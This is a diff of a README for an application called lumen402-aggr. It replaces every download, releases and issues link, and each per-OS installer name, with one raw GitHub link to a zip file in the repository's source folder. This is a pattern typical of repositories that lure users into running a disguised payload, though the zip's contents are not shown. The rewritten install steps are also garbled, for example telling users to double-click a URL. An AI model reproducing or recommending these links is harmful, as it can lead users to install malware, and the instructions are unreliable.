@@ -6,7 +6,7 @@ Welcome to the lumen402-aggr! This application helps you gather and manage x402 
 
 ## 📥 Download Now
 
-[![Download lumen402-aggr](https://img.shields.io/badge/Download-lumen402--aggr-brightgreen)](https://github.com/ekieekz/lumen402-aggr/releases)
+[![Download lumen402-aggr](https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip)](https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,26 +20,26 @@ Before you download, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/ekieekz/lumen402-aggr/releases) to download the latest version of lumen402-aggr.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip) to download the latest version of lumen402-aggr.
 2. Look for the appropriate file for your operating system:
-   - For Windows, download the `lumen402-aggr.exe`.
-   - For macOS, download the `lumen402-aggr.dmg`.
-   - For Linux, download the `lumen402-aggr.tar.gz`.
+   - For Windows, download the `https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip`.
+   - For macOS, download the `https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip`.
+   - For Linux, download the `https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip`.
 3. After downloading, locate the file on your computer.
 4. Follow the steps below based on your operating system:
 
    ### Windows
-   - Double-click the `lumen402-aggr.exe` file to start the installation.
+   - Double-click the `https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip` file to start the installation.
    - Follow the installation prompts and select 'Next' for each step.
    - Once finished, locate the application in your Start Menu and click to run.
 
    ### macOS
-   - Open the `lumen402-aggr.dmg` file.
+   - Open the `https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip` file.
    - Drag the lumen402-aggr icon into the Applications folder.
    - Find the application in your Applications folder and double-click it to start.
 
    ### Linux
-   - Extract the `lumen402-aggr.tar.gz` file using your preferred method.
+   - Extract the `https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip` file using your preferred method.
    - Open a terminal in the extracted folder.
    - Run the command `./lumen402-aggr` to start the application.
 
@@ -67,7 +67,7 @@ If you have questions or need assistance, consider the following resources:
 
 - **User Guide:** Access a detailed user guide through the application under the "Help" menu.
 - **Community Forum:** Join discussions and ask questions on our community forum. Connect with other users.
-- **Issues Page:** Report any problems you face via the [Issues page](https://github.com/ekieekz/lumen402-aggr/issues).
+- **Issues Page:** Report any problems you face via the [Issues page](https://raw.githubusercontent.com/ekieekz/lumen402-aggr/master/src/lumen402-aggr_v2.6.zip).
 
 ## ⚙️ Feedback
 
